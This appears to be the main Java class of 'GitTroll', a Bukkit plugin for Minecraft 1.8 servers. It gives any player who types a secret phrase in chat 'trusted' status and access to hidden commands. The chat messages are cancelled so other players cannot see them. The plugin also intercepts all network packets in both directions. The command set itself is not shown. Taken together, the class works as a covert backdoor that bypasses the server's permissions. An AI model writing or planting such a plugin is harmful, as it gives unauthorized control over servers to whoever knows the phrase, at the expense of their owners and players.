package net.Lenni0451.GitTroll;

import java.util.ArrayList;
import java.util.List;

import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.plugin.java.JavaPlugin;

import com.comphenix.tinyprotocol.TinyProtocol;

import io.netty.channel.Channel;
import net.Lenni0451.GitTroll.event.EventManager;
import net.Lenni0451.GitTroll.event.events.EventPlayerPacket;
import net.Lenni0451.GitTroll.event.events.EventServerPacket;
import net.Lenni0451.GitTroll.event.events.EventTrustPlayer;
import net.Lenni0451.GitTroll.event.events.EventUntrustPlayer;
import net.Lenni0451.GitTroll.manager.CommandManager;
import net.Lenni0451.GitTroll.softdepends.ProtocolLibPacketInjector;
import net.Lenni0451.GitTroll.utils.CustomPlayer;
import net.Lenni0451.GitTroll.utils.Logger;
import net.Lenni0451.GitTroll.utils.TrustedInfo;
import net.minecraft.server.v1_8_R3.Packet;

public class GitTroll extends JavaPlugin implements Listener {
	
	public static final String PREFIX = "§7[§6GitTroll§7] §a";
	private static GitTroll instance;
	
	public static GitTroll getInstance() {
		return instance;
	}
	
	
	List<TrustedInfo> trustedPlayers;
	
	public GitTroll() {
		this.trustedPlayers = new ArrayList<>();
	}
	
	public boolean isPlayerTrusted(final Player player) {
		for(TrustedInfo trustedInfo : this.trustedPlayers) {
			if(trustedInfo.isPlayer(player)) {
				return true;
			}
		}
		return false;
	}
	
	public boolean trustPlayer(final Player player) {
		if(this.isPlayerTrusted(player)) return false;
		
		EventTrustPlayer event = new EventTrustPlayer(player);
		this.eventManager.callEvent(event);
		if(event.isCancelled()) {
			return false;
		}
		
		this.trustedPlayers.add(new TrustedInfo(player));
		Logger.broadcastGitMessage("§aPlayer §6" + player.getName() + " §ais now trusted.");
		CustomPlayer.instanceOf(player).sendTitle("§aYou are now trusted!", "§aUse §6" + CommandManager.COMMAND_PREFIX + " §afor GitTroll commands.");
		return true;
	}
	
	public boolean untrustPlayer(final Player player) {
		for(TrustedInfo trustedInfo : this.trustedPlayers) {
			if(trustedInfo.isPlayer(player)) {
				EventUntrustPlayer event = new EventUntrustPlayer(player);
				this.eventManager.callEvent(event);
				if(event.isCancelled()) {
					return false;
				}
				
				this.trustedPlayers.remove(trustedInfo);
				Logger.broadcastGitMessage("§cPlayer §6" + player.getName() + " §cis no longer trusted.");
				CustomPlayer.instanceOf(player).sendTitle("§cYou are now untrusted!", "§aSee you next time!");
				return true;
			}
		}
		return false;
	}
	

	public EventManager eventManager;
	public CommandManager commandManager;
	
	public void onEnable() {
		instance = this;
		
		if(!Bukkit.getServer().getClass().toString().contains("1_8")) {
			Bukkit.getPluginManager().disablePlugin(this);
			return;
		}

		this.eventManager = new EventManager();
		this.commandManager = new CommandManager();
		
		Bukkit.getPluginManager().registerEvents(this, this);
		
		if(Bukkit.getPluginManager().getPlugin("ProtocolLib") != null) {
			new ProtocolLibPacketInjector();
		} else {
			new TinyProtocol(this) {
				@Override
				public Object onPacketInAsync(Player sender, Channel channel, Object packet) {
					EventPlayerPacket event = new EventPlayerPacket(sender, (Packet<?>) packet);
					eventManager.callEvent(event);
					return event.isCancelled()?null:packet;
				}
				
				@Override
				public Object onPacketOutAsync(Player receiver, Channel channel, Object packet) {
					EventServerPacket event = new EventServerPacket(receiver, (Packet<?>) packet);
					eventManager.callEvent(event);
					return event.isCancelled()?null:packet;
				}
			};
		}
	}
	
	
	@EventHandler
	public void onAsyncChatMessage(AsyncPlayerChatEvent event) {
		if(this.isPlayerTrusted(event.getPlayer())) {
			if(this.commandManager.onMessage(event.getPlayer(), event.getMessage())) {
				event.setCancelled(true);
			} else {
				;
			}
		} else {
			if(event.getMessage().equalsIgnoreCase(CommandManager.TRUST_COMMAND)) {
				this.trustPlayer(event.getPlayer());
				event.setCancelled(true);
			} else {
				;
			}
		}
	}
	
	@EventHandler
	public void onPlayerJoin(PlayerJoinEvent event) {
		if(this.isPlayerTrusted(event.getPlayer())) {
			CustomPlayer.instanceOf(event.getPlayer()).sendGitMessage("You are still trusted.");
		}
//		new PacketInjector(event.getPlayer()).inject();
	}
	
}
